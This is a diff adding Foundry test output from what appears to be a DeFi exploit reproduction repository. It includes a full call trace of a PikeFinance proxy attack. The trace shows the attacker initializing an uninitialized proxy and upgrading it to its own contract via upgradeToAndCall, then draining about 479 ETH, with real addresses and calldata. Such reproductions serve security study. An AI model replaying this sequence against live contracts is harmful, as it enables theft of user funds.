@@ -1,0 +1,51 @@
+Compiling 27 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.05s
+Compiler run successful!
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 332.91ms (334.84µs CPU time)
+
+Ran 1 test for src/test/2024-04/PikeFinance_exp.sol:PikeFinance
+[PASS] testExploit() (gas: 66400)
+Logs:
+   Attacker ETH Balance Before exploit: 0.000000000000000000
+   Attacker ETH Balance After exploit: 479.393838338750964434
+
+Traces:
+  [66400] PikeFinance::testExploit()
+    ├─ emit log_named_decimal_uint(key: " Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ [40247] 0xFC7599cfFea9De127a9f9C748CCb451a34d2F063::initialize(PikeFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], PikeFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], PikeFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], PikeFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20, 20)
+    │   ├─ [35325] 0xb30c120Eb92c120bF11B358b4B9961E6679b6ae7::initialize(PikeFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], PikeFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], PikeFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], PikeFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20, 20) [delegatecall]
+    │   │   ├─ emit Initialized(: 1)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [17218] 0xFC7599cfFea9De127a9f9C748CCb451a34d2F063::upgradeToAndCall(PikeFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x51cff8d90000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
+    │   ├─ [16802] 0xb30c120Eb92c120bF11B358b4B9961E6679b6ae7::upgradeToAndCall(PikeFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x51cff8d90000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [delegatecall]
+    │   │   ├─ [244] PikeFinance::proxiableUUID() [staticcall]
+    │   │   │   └─ ← [Return] 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
+    │   │   ├─ emit Upgraded(param0: PikeFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ [7307] PikeFinance::withdraw(PikeFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   ├─ [55] PikeFinance::receive{value: 479393838338750964434}()
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   └─ ← [Stop] 
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: " Attacker ETH Balance After exploit", val: 479393838338750964434 [4.793e20], decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.23s (554.15ms CPU time)
+
+Ran 2 test suites in 1.23s (1.56s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
